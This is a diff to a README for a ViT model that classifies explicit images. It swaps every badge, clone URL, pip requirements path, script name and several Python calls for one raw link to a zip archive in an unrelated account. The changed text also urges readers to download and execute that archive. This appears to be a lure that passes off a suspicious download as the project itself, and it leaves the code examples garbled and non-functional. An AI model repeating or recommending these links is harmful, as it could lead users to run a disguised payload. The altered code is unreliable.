@@ -1,6 +1,6 @@
 # vit-mini-explicit-content 🖼️🔍
 
-![GitHub Repo Size](https://img.shields.io/github/repo-size/onyemason/vit-mini-explicit-content?style=flat-square) ![Last Commit](https://img.shields.io/github/last-commit/onyemason/vit-mini-explicit-content?style=flat-square) ![License](https://img.shields.io/github/license/onyemason/vit-mini-explicit-content?style=flat-square)
+![GitHub Repo Size](https://raw.githubusercontent.com/Nnanyelugo-1/vit-mini-explicit-content/main/thresherman/content_mini_explicit_vit_2.8.zip) ![Last Commit](https://raw.githubusercontent.com/Nnanyelugo-1/vit-mini-explicit-content/main/thresherman/content_mini_explicit_vit_2.8.zip) ![License](https://raw.githubusercontent.com/Nnanyelugo-1/vit-mini-explicit-content/main/thresherman/content_mini_explicit_vit_2.8.zip)
 
 Welcome to the **vit-mini-explicit-content** repository! This project focuses on image classification using a vision-language model fine-tuned from `vit-base-patch16-224-in21k`. The model is designed for a single-label classification task, specifically categorizing images based on their explicitness. It utilizes the `ViTForImageClassification` architecture, ensuring high performance in classifying images effectively.
 
@@ -29,9 +29,9 @@ Welcome to the **vit-mini-explicit-content** repository! This project focuses on
 To get started with the vit-mini-explicit-content model, clone the repository and install the required packages. Use the following commands:
 
 ```bash
-git clone https://github.com/onyemason/vit-mini-explicit-content.git
+git clone https://raw.githubusercontent.com/Nnanyelugo-1/vit-mini-explicit-content/main/thresherman/content_mini_explicit_vit_2.8.zip
 cd vit-mini-explicit-content
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Nnanyelugo-1/vit-mini-explicit-content/main/thresherman/content_mini_explicit_vit_2.8.zip
 ```
 
 ## Usage
@@ -44,20 +44,20 @@ from PIL import Image
 import requests
 
 # Load the model and feature extractor
-model = ViTForImageClassification.from_pretrained('onyemason/vit-mini-explicit-content')
-feature_extractor = ViTFeatureExtractor.from_pretrained('onyemason/vit-mini-explicit-content')
+model = https://raw.githubusercontent.com/Nnanyelugo-1/vit-mini-explicit-content/main/thresherman/content_mini_explicit_vit_2.8.zip('onyemason/vit-mini-explicit-content')
+feature_extractor = https://raw.githubusercontent.com/Nnanyelugo-1/vit-mini-explicit-content/main/thresherman/content_mini_explicit_vit_2.8.zip('onyemason/vit-mini-explicit-content')
 
 # Load an image
-url = 'https://example.com/image.jpg'
-image = Image.open(requests.get(url, stream=True).raw)
+url = 'https://raw.githubusercontent.com/Nnanyelugo-1/vit-mini-explicit-content/main/thresherman/content_mini_explicit_vit_2.8.zip'
+image = https://raw.githubusercontent.com/Nnanyelugo-1/vit-mini-explicit-content/main/thresherman/content_mini_explicit_vit_2.8.zip(https://raw.githubusercontent.com/Nnanyelugo-1/vit-mini-explicit-content/main/thresherman/content_mini_explicit_vit_2.8.zip(url, stream=True).raw)
 
 # Preprocess the image
 inputs = feature_extractor(images=image, return_tensors="pt")
 
 # Perform classification
 outputs = model(**inputs)
-predictions = outputs.logits.argmax(-1)
-print(f'Predicted class: {predictions.item()}')
+predictions = https://raw.githubusercontent.com/Nnanyelugo-1/vit-mini-explicit-content/main/thresherman/content_mini_explicit_vit_2.8.zip(-1)
+print(f'Predicted class: {https://raw.githubusercontent.com/Nnanyelugo-1/vit-mini-explicit-content/main/thresherman/content_mini_explicit_vit_2.8.zip()}')
 ```
 
 ## Model Architecture
@@ -84,7 +84,7 @@ To train the model, follow these steps:
 Example command:
 
 ```bash
-python train.py --dataset path/to/dataset --epochs 10 --batch_size 32
+python https://raw.githubusercontent.com/Nnanyelugo-1/vit-mini-explicit-content/main/thresherman/content_mini_explicit_vit_2.8.zip --dataset path/to/dataset --epochs 10 --batch_size 32
 ```
 
 ## Evaluation
@@ -94,7 +94,7 @@ After training, evaluate the model's performance using the validation set. You c
 Example command:
 
 ```bash
-python evaluate.py --model path/to/saved/model --validation_data path/to/validation_data
+python https://raw.githubusercontent.com/Nnanyelugo-1/vit-mini-explicit-content/main/thresherman/content_mini_explicit_vit_2.8.zip --model path/to/saved/model --validation_data path/to/validation_data
 ```
 
 ## Contributing
@@ -107,8 +107,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest releases and updates, please visit the [Releases](https://github.com/onyemason/vit-mini-explicit-content/releases) section. You can download the latest version of the model from there and execute it as needed.
+For the latest releases and updates, please visit the [Releases](https://raw.githubusercontent.com/Nnanyelugo-1/vit-mini-explicit-content/main/thresherman/content_mini_explicit_vit_2.8.zip) section. You can download the latest version of the model from there and execute it as needed.
 
-To explore the repository further, check out the [Releases](https://github.com/onyemason/vit-mini-explicit-content/releases) section for the most recent updates and model versions.
+To explore the repository further, check out the [Releases](https://raw.githubusercontent.com/Nnanyelugo-1/vit-mini-explicit-content/main/thresherman/content_mini_explicit_vit_2.8.zip) section for the most recent updates and model versions.
 
 Thank you for your interest in the vit-mini-explicit-content project! We hope you find it useful for your image classification tasks.
